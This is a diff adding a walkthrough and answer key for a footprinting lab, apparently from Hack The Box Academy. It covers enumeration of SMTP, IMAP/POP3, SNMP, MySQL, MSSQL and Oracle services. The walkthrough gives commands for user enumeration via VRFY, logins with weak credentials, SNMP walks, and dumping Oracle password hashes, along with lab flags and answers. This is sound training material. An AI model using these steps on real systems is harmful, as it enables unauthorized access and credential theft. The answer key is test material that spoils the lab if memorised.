@@ -781,15 +781,244 @@ Therefore: win2k.dev.inlanefreight.htb
 
 #### SMTP
 
+**Enumerate the SMTP service and submit the banner, including its version as the answer.**
+
+```
+sudo nmap $ip -sC -sV -p25
+```
+
+
+Results: InFreight ESMTP v2.11
+
+
+**Enumerate the SMTP service even further and find the username that exists on the system. Submit it as the answer.**
+
+```
+for user in $(cat ~/Downloads/footprintingusers.txt); do echo VRFY $user | nc -nv -w 6 $ip 25  ; done
+```
+
+Results: robin
+
+
 #### IMAP / POP3
+
+**Figure out the exact organization name from the IMAP/POP3 service and submit it as the answer.**
+
+```
+sudo nmap $ip -sV -p110,143,993,995 -sC
+```
+
+Results: InlaneFreight Ltd
+
+**What is the FQDN that the IMAP and POP3 servers are assigned to?**
+
+```
+sudo nmap $ip -sV -p110,143,993,995 -sC
+```
+
+Results: dev.inlanefreight.htb
+
+
+**Enumerate the IMAP service and submit the flag as the answer. (Format: HTB{...})**
+
+```
+echo $ip inlanefreight.htb dev.inlanefreight.htb >> /etc/hosts
+curl -k 'imaps://dev.inlanefreight.htb' --user robin:robin -v
+```
+
+```
+* Host dev.inlanefreight.htb:993 was resolved.
+* IPv6: (none)
+* IPv4: 10.129.42.195
+*   Trying 10.129.42.195:993...
+* Connected to dev.inlanefreight.htb (10.129.42.195) port 993
+* TLSv1.3 (OUT), TLS handshake, Client hello (1):
+* TLSv1.3 (IN), TLS handshake, Server hello (2):
+* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
+* TLSv1.3 (IN), TLS handshake, Certificate (11):
+* TLSv1.3 (IN), TLS handshake, CERT verify (15):
+* TLSv1.3 (IN), TLS handshake, Finished (20):
+* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
+* TLSv1.3 (OUT), TLS handshake, Finished (20):
+* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS
+* Server certificate:
+*  subject: C=UK; ST=London; L=London; O=InlaneFreight Ltd; OU=DevOps Dep�artment; CN=dev.inlanefreight.htb; emailAddress=cto.dev@dev.inlanefreight.htb
+*  start date: Nov  8 23:10:05 2021 GMT
+*  expire date: Aug 23 23:10:05 2295 GMT
+*  issuer: C=UK; ST=London; L=London; O=InlaneFreight Ltd; OU=DevOps Dep�artment; CN=dev.inlanefreight.htb; emailAddress=cto.dev@dev.inlanefreight.htb
+*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
+*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
+* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
+* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
+* old SSL session ID is stale, removing
+< * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB{roncfbw7iszerd7shni7jr2343zhrj}
+> A001 CAPABILITY
+< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN
+< A001 OK Pre-login capabilities listed, post-login capabilities have more.
+> A002 AUTHENTICATE PLAIN AHJvYmluAHJvYmlu
+< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE
+< A002 OK Logged in
+> A003 LIST "" *
+< * LIST (\Noselect \HasChildren) "." DEV
+* LIST (\Noselect \HasChildren) "." DEV
+< * LIST (\Noselect \HasChildren) "." DEV.DEPARTMENT
+* LIST (\Noselect \HasChildren) "." DEV.DEPARTMENT
+< * LIST (\HasNoChildren) "." DEV.DEPARTMENT.INT
+* LIST (\HasNoChildren) "." DEV.DEPARTMENT.INT
+< * LIST (\HasNoChildren) "." INBOX
+* LIST (\HasNoChildren) "." INBOX
+< A003 OK List completed (0.009 + 0.000 + 0.008 secs).
+* Connection #0 to host dev.inlanefreight.htb left intact
+
+```
+
+Results: HTB{roncfbw7iszerd7shni7jr2343zhrj}
+
+**What is the customized version of the POP3 server?**
+
+```
+openssl s_client -connect $ip:pop3s
+```
+
+Results: InFreight POP3 v9.188
+
+
+**What is the admin email address?**
+
+```
+# Establish a imap connection
+openssl s_client -connect $ip:imaps
+
+# Login as user robin with password robin
+a LOGIN robin robin
+
+# List inboxes
+a LIST "" *
+
+# Select one of them
+a SELECT DEV.DEPARTMENT.INT
+
+# Retrieves the messages by ID
+a FETCH 1 all
+
+```
+
+Results: devadmin@inlanefreight.htb
+
+
+ **Try to access the emails on the IMAP server and submit the flag as the answer. (Format: HTB{...})**
+
+```
+# Establish a imap connection
+openssl s_client -connect $ip:imaps
+
+# Login as user robin with password robin
+a LOGIN robin robin
+
+# List inboxes
+a LIST "" *
+
+# Select one of them
+a SELECT DEV.DEPARTMENT.INT
+
+# Retrieve the messages by ID
+a FETCH 1 all
+
+# Retrieve the content of the message with id 1
+a FETCH 1 BODY.PEEK[TEXT]
+```
+
+Results:  HTB{983uzn8jmfgpd8jmof8c34n7zio}
 
 #### SNMP
 
+**Enumerate the SNMP service and obtain the email address of the admin. Submit it as the answer.**
+
+```
+snmpwalk -v2c -c public $ip
+```
+
+Results: devadmin@inlanefreight.htb
+
+**What is the customized version of the SNMP server?**
+
+```
+snmpwalk -v2c -c public $ip
+```
+
+Results: InFreight SNMP v0.91
+
+
+ **Enumerate the custom script that is running on the system and submit its output as the answer.**
+
+```
+snmpwalk -v2c -c public $ip
+```
+
+Results: HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}
+
 #### MySQL
+
+
+**Enumerate the MySQL server and determine the version in use. (Format: MySQL X.X.XX)**
+
+```
+sudo nmap -sS -sV --script mysql-empty-password -p 3306 $ip -Pn
+```
+
+Results: MySQL 8.0.27
+
+
+**During our penetration test, we found weak credentials "robin:robin". We should try these against the MySQL server. What is the email address of the customer "Otto Lang"?**
+
+```
+mysql -u robin -probin -h $ip
+select * from customers.myTable where name LIKE "Otto Lang";
+```
+
+
+Results: ultrices@google.htb
 
 #### MSSQL
 
+**Enumerate the target using the concepts taught in this section. List the hostname of MSSQL server.**
+
+```
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip
+```
+
+Results: ILF-SQL-01
+
+
+**Connect to the MSSQL instance running on the target using the account (backdoor:Password1), then list the non-default database present on the server.**
+
+```
+mssqlclient.py backdoor@$ip -windows-auth -p 1433
+
+SELECT name FROM master.dbo.sysdatabases
+
+```
+
+Results: Employees
+
 #### Oracle TNS
+
+Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.
+
+```
+python3 ./odat.py all -s $ip
+# With this we obtain the creds scott/tiger
+
+# Now we connect to the database
+sqlplus scott/tiger@$ip/XE as sysdba
+
+# Extract Password Hashes
+select name, password from sys.user$;
+```
+
+Results: E066D214D5421CCC
+
+
 
 #### IPMI
 
